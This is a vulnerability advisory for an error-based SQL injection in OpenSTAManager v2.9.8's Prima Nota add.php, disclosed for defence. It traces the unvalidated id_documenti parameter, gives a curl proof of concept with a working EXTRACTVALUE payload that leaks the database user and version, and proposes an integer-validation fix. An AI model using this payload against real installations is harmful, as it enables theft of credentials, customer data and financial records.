summary: "OpenSTAManager has a SQL Injection in the Prima Nota  module\n### Summary\n\nCritical\
  \ Error-Based SQL Injection vulnerability in the Prima Nota (Journal Entry) module of OpenSTAManager\
  \ v2.9.8 allows authenticated attackers to extract complete database contents including user\
  \ credentials, customer PII, and financial records through XML error messages by injecting\
  \ malicious SQL into URL parameters.\n\n**Status:** ✅ Confirmed and tested on live instance\
  \ (v2.9.8)\n**Vulnerable Parameters:** `id_documenti` (GET parameters)\n**Affected Endpoint:**\
  \ `/modules/primanota/add.php`\n**Attack Type:** Error-Based SQL Injection (IN clause)\n\n\
  ### Details\n\nOpenSTAManager v2.9.8 contains a critical Error-Based SQL Injection vulnerability\
  \ in the Prima Nota (Journal Entry) module's add.php file. The application fails to validate\
  \ that comma-separated values from GET parameters are integers before using them in SQL IN()\
  \ clauses, allowing attackers to inject arbitrary SQL commands and extract sensitive data\
  \ through XPATH error messages.\n\n**Vulnerability Chain:**\n\n1. **Entry Point:** `/modules/primanota/add.php`\
  \ (Lines 63-67)\n   ```php\n   $id_documenti = $id_documenti ?: get('id_documenti');\n   $id_documenti\
  \ = $id_documenti ? explode(',', (string) $id_documenti) : [];\n   ```\n   **Impact:** The\
  \ `get()` function retrieves user-controlled URL parameters, `explode(',', (string) ...)`\
  \ splits them by comma, but NO validation ensures elements are integers.\n\n2. **SQL Injection\
  \ Point:** `/modules/primanota/add.php` (Line 306)\n   ```php\n   $id_anagrafica = $dbo->fetchOne('SELECT\
  \ idanagrafica FROM co_documenti WHERE id IN('.($id_documenti ? implode(',', $id_documenti)\
  \ : 0).')')['idanagrafica'];\n   ```\n   **Impact:** Array elements from `$id_documenti` are\
  \ directly concatenated using `implode()` without type validation or `prepare()`, enabling\
  \ full SQL injection. \n\n\n**Root Cause Analysis:**\n\nThe vulnerability exists because:\n\
  1. `get('id_documenti')`  return user-controlled strings\n2. `explode(',', (string) $value)`\
  \ splits by comma but doesn't validate types\n3. `implode(',', $array)` concatenates array\
  \ elements directly into SQL\n4. No validation ensures array elements are integers\n5. Attacker\
  \ can inject SQL by providing: `?id_documenti=1) AND EXTRACTVALUE(...) %23`\n\n**Affected\
  \ Code Path:**\n```\nGET /modules/primanota/add.php?id_documenti=MALICIOUS_PAYLOAD\n  ↓\n\
  add.php:63 - $id_documenti = get('id_documenti')\n  ↓\nadd.php:64 - $id_documenti = explode(',',\
  \ (string) $id_documenti) [NO TYPE VALIDATION]\n  ↓\nadd.php:306 - WHERE id IN('.implode(',',\
  \ $id_documenti).') [INJECTION POINT]\n```\n\n### PoC\n\n\n**Step 1: Login**\n```bash\ncurl\
  \ -c /tmp/cookies.txt -X POST 'http://localhost:8081/index.php?op=login' \\\n  -d 'username=admin&password=admin'\n\
  ```\n\n**Step 2: Verify Vulnerability (Error-Based SQL Injection)**\n\n**Test 1: Extract Database\
  \ User and Version**\n```bash\ncurl -b /tmp/cookies.txt \"http://localhost:8081/modules/primanota/add.php?id_documenti=1)%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,(SELECT%20CONCAT(USER(),'%20|%20',VERSION()))))%23\"\
  \n```\n\n**Response (error message visible to attacker):**\n```html\n<code>SQLSTATE[HY000]:\
  \ General error: 1105 XPATH syntax error: &#039;~osm@172.18.0.3 | 8.3.0&#039;</code>\n```\n\
  <img width=\"1231\" height=\"405\" alt=\"image\" src=\"https://github.com/user-attachments/assets/1657b844-281a-431b-8472-c81e4d90bf64\"\
  \ />\n\n\n### Impact\n\nAll authenticated users with access to the Prima Nota (Journal Entry)\
  \ module.\n\n\n### Recommended Fix\n\n**Primary Fix - Type Validation:**\n\nFile: `/modules/primanota/add.php`\n\
  \n**BEFORE (Vulnerable - Lines 63-67):**\n```php\n$id_documenti = $id_documenti ?: get('id_documenti');\n\
  $id_documenti = $id_documenti ? explode(',', (string) $id_documenti) : [];\n```\n\n**AFTER\
  \ (Fixed):**\n```php\n$id_documenti = $id_documenti ?: get('id_documenti');\n$id_documenti\
  \ = $id_documenti ? explode(',', (string) $id_documenti) : [];\n// Validate that all array\
  \ elements are integers\n$id_documenti = array_map('intval', $id_documenti);\n$id_documenti\
  \ = array_filter($id_documenti, fn($id) => $id > 0); // Remove zero/negative IDs\n```\n\n\
  ### Credits\nDiscovered by Łukasz Rybak"
